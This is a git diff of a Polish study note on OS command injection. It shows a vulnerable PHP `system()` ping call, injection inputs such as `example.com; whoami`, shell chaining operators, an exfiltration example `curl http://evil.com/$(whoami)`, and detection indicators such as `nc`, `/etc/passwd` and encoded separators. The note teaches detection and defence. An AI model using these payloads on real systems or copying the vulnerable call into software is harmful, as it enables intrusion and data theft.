@@ -15,8 +15,8 @@ Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejści
 
 ## Działanie ataku
 - aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $_GET['host']);`, 
-- gdy użytkownik wpisuje np. example.com - aplikacja wykonuje ping example.com, 
-- atakujący wpisuje example.com; whoami, 
+- gdy użytkownik wpisuje np. `example.com` - aplikacja wykonuje `ping example.com`, 
+- atakujący wpisuje `example.com; whoami`, 
 - `;` kończy pierwsze polecenie i uruchamia drugie, więc system wykonuje oba, 
 - aplikacja zwraca wynik `whoami` (np. www-data) na stronie, 
 - atakujący wie, że skoro widzi wynik, to ma możliwość zdalnego wykonywania poleceń, 
@@ -25,7 +25,7 @@ Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejści
 	- `|` - przekazuje wynik jednego polecenia do drugiego, 
 	- `&&` - wykonaj drugie, jeśli pierwsze się uda, 
 	- `||` - wykonaj drugie polecenie, jeśli pierwsze się nie uda, 
-	- `$(uname -a)` - wstaw wynik polecenia w to miejsce, ( np. w parametrze: wykonaj `uname -a` w parametrze oznacza: wykonaj `uname -a` i wstaw wynik),  
+	- `$(uname -a)` - wykonaj polecenie wstaw wynik w to miejsce,
 	- `` ` `` - wykonaj polecenie w środku (backtick),
 - Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera). Atakujący może także wysłać wynik do swojego serwera - np. `curl http://evil.com/$(whoami)`.  
 
@@ -37,7 +37,7 @@ Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejści
 	- nazwy poleceń: `whoami`, `id`, `ls`, `cat`, `uname`, `wget`, `curl`, `nc` (netcat - używany do reverse shell) - to polecenia systemowe, które może spróbować wykonać atakujący, 
 	- ścieżki `/etc/passwd`, `/bin/bash` - próba odczytu plików systemowych, 
 	- zakodowane wersje `%3B` -> `;`, `%7C` -> `|`, `%26` -> `&` - próba obejścia filtrów, 
-	- duże opóźnienia w odpowiedziach - możliwy blind injection, 
+	- duże opóźnienia w odpowiedziach - możliwy Blind Command Injection, 
 - dodatkowe źródła wykrycia: 
 	- WAF - loguje payloady, które wyzwoliły reguły, 
 	- Logi aplikacji - jeśli loguje wywołanie `system() / exec()`, 
